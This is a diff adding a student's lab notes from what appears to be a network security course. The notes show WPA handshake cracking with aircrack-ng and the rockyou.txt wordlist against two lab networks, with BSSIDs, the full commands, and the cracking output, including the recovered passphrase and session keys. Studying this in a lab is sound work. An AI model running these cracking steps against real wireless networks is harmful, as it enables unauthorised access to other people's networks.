@@ -1,0 +1,57 @@
+Exercise 1:
+
+BSSID is the MAC. Command for windows: (readme.md)
+
+SSID 6 : NETSEC
+    BSSID 1 : AC:84:C6:B8:7D:6C
+
+    obscurity
+
+SSID 9 : SYSSEC
+    BSSID 1 : 98:DA:C4:28:48:06
+
+
+
+We'll need a big password dictionarity file; 10k-most-common.txt won't be ok.
+
+-> rockyou.txt will be ... we use that:
+    -> just find it somewhere on google and extract it ; won't be commited cause of file size
+
+(Words.txt from Diego will also work.) 
+
+aircrack-ng -w rockyou.txt AC:84:C6:B8:7D:6C netsec-handshake.cap
+
+Aircrack-ng 1.7 
+
+      [00:00:03] 36102/14344391 keys tested (11230.75 k/s) 
+
+      Time left: 21 minutes, 14 seconds                          0.25%
+
+                        Current passphrase: fireball1                  
+
+      Master Key     : F7 F0 96 D8 32 12 27 C2 D3 85 F9 A4 6F 38 BB 8A 
+                       DC 1B 16 FB 1A CE 0B AB D8 C9 C1 D2 43 C1 F9 2D 
+
+      Transient Key  : BA 09 69 52 12 BE F4 05 E8 EC C4 7B D6 E7 62 F3 
+                       67 45 BB E0 82 19 62 D7 2A 0C B4 22 76 A7 BD 02 
+                       E7 83 60 84 88 0D EC C4 67 15 2F C5 03 28 62 19 
+                       29 EF 4A 00 C2 F1 FC 9A AD 12 CB 1F 50 61 91 4C 
+
+      EAPOL HMAC     : C0 12 C3 C1 9B 8F 70 70 E5 DC 0D 1D 23 F3 6F 44 
+
+      [00:01:15] 805054/14344391 keys tested (10840.91 k/s) 
+
+      Time left: 20 minutes, 48 seconds                          5.61%
+
+                           KEY FOUND! [ obscurity ]
+
+
+aircrack-ng -w rockyou.txt 98:DA:C4:28:48:06 syssec-handshake.cap
+
+Exercise 2
+
+connect to SYSSEC or NETSEC on Host OS, configure the network settings and restart the VM. Then follow the exercise.
+
+Exercise 3
+
+Just follow the steps
